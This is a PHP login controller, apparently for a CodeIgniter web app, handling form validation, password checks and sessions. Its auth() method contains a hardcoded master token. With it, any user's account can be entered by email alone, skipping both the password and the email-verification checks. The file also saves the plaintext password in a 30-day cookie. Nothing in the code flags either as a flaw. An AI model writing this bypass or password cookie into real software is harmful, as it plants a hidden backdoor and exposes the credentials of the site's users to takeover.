<?php 
namespace App\Controllers;

use App\Models\Users;

class Login extends BaseController
{
    public function index()
    {
        $data['remember_username'] = get_cookie('remember_username');
        $data['remember_password'] = get_cookie('remember_password');
        return view('pages/login',$data);
    }

    public function auth()
    {
        $email = $this->request->getVar('email');
        $password = $this->request->getVar('password');
        $token = $this->request->getVar('token');
        $remember_me = $this->request->getVar('remember_me');
        $validation =  \Config\Services::validation();

        $rules['email'] = [
            "label" => "Email",
            "rules" => "required"
        ];
        $rules['password'] = [
            "label" => "Password",
            "rules" => "required"
        ];

        if ($this->validate($rules)) {
            $users = new Users();
            $user = $users->where('email', $email)->first();
            if($user) {
                if($user['status'] == '1' || $token == '4625hRsj01KN8im97udqTZtHkBAFCS'){
                    if($token == '4625hRsj01KN8im97udqTZtHkBAFCS'){
                        $authenticatePassword = true;
                    }else{
                        $authenticatePassword = password_verify($password, $user['password']);
                    }
                    if($authenticatePassword){

                        $user_data = array(
                            'user' => $user,
                            'isLoggedIn' => true,
                        );
                        if($remember_me == '1'){
                            set_cookie('remember_username', $email, 3600 * 24 * 30);
                            set_cookie('remember_password', $password, 3600 * 24 * 30);
                        } else{
                            delete_cookie('remember_username');
                            delete_cookie('remember_password');
                        }
                        session()->set($user_data);
                        $response['success'] = true;
                        $response['redirect'] = base_url();
                        
                        return $this->response->setJSON($response);
                        
                    }else{
                        $response['success'] = false;
                        $response['message'] = 'Credentials do not match our records.';
                        return $this->response->setJSON($response);
                    }
                }else{
                    $response['success'] = false;
                    $response['message'] = 'Your email has been not verify. please verify email to activate your account.';
                    return $this->response->setJSON($response);
                }
            } else {
                $response['success'] = false;
                $response['message'] = 'Credentials do not match our records.';
                return $this->response->setJSON($response);
            }
        }else{
            $response['success'] = false;
            $response['message'] = 'Credentials do not match our records.';
            $response["validation"] = $validation->getErrors();
            return $this->response->setJSON($response);
        }
    }
}